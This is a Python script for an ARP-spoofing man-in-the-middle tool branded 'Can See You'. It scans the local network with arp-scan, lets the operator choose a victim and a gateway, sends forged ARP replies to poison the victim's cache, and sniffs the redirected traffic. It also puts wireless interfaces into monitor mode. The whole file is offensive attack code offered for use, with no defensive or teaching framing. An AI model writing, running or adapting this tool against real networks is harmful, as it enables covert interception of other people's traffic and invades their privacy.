import os
import threading
from scapy.all import *
import time
import sys
import subprocess
import netifaces  # For getting the gateway IP


RESET = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"


def get_gateway_ip():
    """
    Fetch the default gateway IP address from system's network config.
    This helps us identify the router during the attack.
    """
    gateways = netifaces.gateways()
    gateway = gateways.get('default', {}).get(netifaces.AF_INET)
    return gateway[0] if gateway else None


def display_banner():
    """
    Show a banner with the tool name and credits.
    Just for style.
    """
    print(f"""
    {BLUE}############################################
    #         Can See You - MITM Tool           #
    #         Developed by {YELLOW}Kira xD{BLUE}              #
    ############################################{RESET}
    """)


def enable_monitor_mode(interface):
    """
    Puts the wireless interface into monitor mode. 
    Needed to sniff all traffic.
    """
    print(f"{GREEN}[*] Enabling monitor mode on {interface}...{RESET}")
    try:
        subprocess.call(['airmon-ng', 'check', 'kill'])
        subprocess.call(['airmon-ng', 'start', interface])
        print(f"{GREEN}[*] {interface} is now in monitor mode.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Couldn't enable monitor mode: {str(e)}{RESET}")
        sys.exit(1)


def disable_monitor_mode(interface):
    """
    Return the interface back to normal mode.
    We don't want to leave it in monitor mode after we're done.
    """
    print(f"{YELLOW}[*] Disabling monitor mode on {interface}...{RESET}")
    try:
        subprocess.call(['airmon-ng', 'stop', interface])
        print(f"{GREEN}[*] {interface} is back to managed mode.{RESET}")
        subprocess.call(['service', 'network-manager', 'restart'])
    except Exception as e:
        print(f"{RED}[!] Couldn't disable monitor mode: {str(e)}{RESET}")


def scan_network(interface):
    """
    Use arp-scan to list all devices on the local network.
    We’ll look for potential targets and the gateway.
    """
    print(f"{BLUE}[*] Scanning the network...{RESET}")
    gateway_ip = get_gateway_ip()  # We'll mark the gateway when we find it
    try:
        result = subprocess.check_output(['arp-scan', '-l', '-I', interface], universal_newlines=True)
        devices = []
        for line in result.splitlines():
            if "Response" in line or "Interface" in line or "Starting" in line:
                continue
            parts = line.split()
            if len(parts) > 1:
                ip_address = parts[0]
                mac_address = parts[1]
                # Check if this is the gateway
                if ip_address == gateway_ip:
                    devices.append((ip_address, mac_address, True))  # True = it's the gateway
                else:
                    devices.append((ip_address, mac_address, False))
        return devices
    except Exception as e:
        print(f"{RED}[!] Network scan failed: {str(e)}{RESET}")
        return []


def select_device(devices, role="target"):
    """
    Show the list of devices found during the scan.
    Let the user pick the target and gateway from the list.
    """
    if not devices:
        print(f"{RED}[!] No devices found on the network.{RESET}")
        sys.exit(1)
    
    print(f"\n{BLUE}Available Devices on the Network:{RESET}")
    for i, (ip, mac, is_gateway) in enumerate(devices):
        label = "(Gateway)" if is_gateway else ""
        print(f"{YELLOW}{i + 1}. IP: {ip} - MAC: {mac} {label}{RESET}")
    
    choice = input(f"\n{BLUE}[*] Pick the {role} device number: {RESET}")
    
    try:
        index = int(choice) - 1
        if 0 <= index < len(devices):
            return devices[index]
        else:
            print(f"{RED}[!] Invalid choice, try again.{RESET}")
            return select_device(devices, role)
    except ValueError:
        print(f"{RED}[!] Please enter a valid number.{RESET}")
        return select_device(devices, role)


def arp_spoof(target_ip, spoof_ip, target_mac):
    """
    Send ARP spoofing packets to trick the target and gateway.
    This starts the MITM attack.
    """
    print(f"{YELLOW}[*] Spoofing ARP for {target_ip}{RESET}")
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
    send(arp_response, verbose=False)


def sniff_packets(iface):
    """
    Start capturing packets after ARP spoofing is successful.
    Let's see what we can intercept.
    """
    print(f"{YELLOW}[*] Sniffing packets...{RESET}")
    sniff(iface=iface, store=False, prn=process_packet)


def process_packet(packet):
    """
    Process packets, printing source and destination IPs for now.
    Can be extended to inspect the contents of intercepted packets.
    """
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        print(f"{BLUE}Captured: {src_ip} -> {dst_ip}{RESET}")


def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    After the attack, restore ARP tables so the devices can communicate normally again.
    Clean exit.
    """
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=4, verbose=False)
    print(f"{GREEN}[*] Network restored after attack.{RESET}")


def mitm_attack(victim_ip, gateway_ip, interface):
    """
    Main attack logic. Select the victim and gateway, 
    start ARP spoofing, and sniff traffic.
    """
    print(f"{GREEN}[*] Starting MITM on {victim_ip} via gateway {gateway_ip}{RESET}")
    
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not victim_mac or not gateway_mac:
        print(f"{RED}[!] Failed to get MAC addresses. Exiting.{RESET}")
        sys.exit(1)
    
    
    spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, victim_mac))
    spoof_thread.start()

    try:
        sniff_packets(interface)  # Sniff traffic while ARP spoofing
    except KeyboardInterrupt:
        print(f"{YELLOW}[*] Restoring network after attack...{RESET}")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sys.exit(0)


def menu():
    """
    Show the main menu with options to enable/disable monitor mode,
    scan the network, or start the MITM attack.
    """
    while True:
        print(f"\n{BLUE}================= Can See You Menu ================={RESET}")
        print(f"{YELLOW}1. Enable Monitor Mode{RESET}")
        print(f"{YELLOW}2. Disable Monitor Mode{RESET}")
        print(f"{YELLOW}3. Scan Network and Start MITM Attack{RESET}")
        print(f"{YELLOW}4. Exit{RESET}")
        
        choice = input(f"{BLUE}[*] Pick an option: {RESET}")

        if choice == '1':
            iface = input(f"{BLUE}[*] Enter the interface (e.g., wlan0): {RESET}")
            enable_monitor_mode(iface)

        elif choice == '2':
            iface = input(f"{BLUE}[*] Enter the interface (e.g., wlan0): {RESET}")
            disable_monitor_mode(iface)

        elif choice == '3':
            iface = input(f"{BLUE}[*] Enter the interface (e.g., wlan0): {RESET}")
            devices = scan_network(iface)

            
            victim_ip, victim_mac, _ = select_device(devices)
            print(f"{YELLOW}[*] Target selected: {victim_ip} - MAC: {victim_mac}{RESET}")
            
            gateway_ip, gateway_mac, _ = select_device(devices, role="gateway")
            print(f"{YELLOW}[*] Gateway selected: {gateway_ip} - MAC: {gateway_mac}{RESET}")

            mitm_attack(victim_ip, gateway_ip, iface)

        elif choice == '4':
            print(f"{GREEN}[*] Exiting Can See You...{RESET}")
            sys.exit(0)

        else:
            print(f"{RED}[!] Invalid option, try again.{RESET}")


def get_mac(ip):
    """
    Send ARP request to get the MAC address of a given IP.
    We need MACs to perform ARP spoofing.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"{RED}[!] Couldn't get MAC address for {ip}{RESET}")
        return None


if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}[!] Please run as root.{RESET}")
        sys.exit(1)

    display_banner()
    menu()

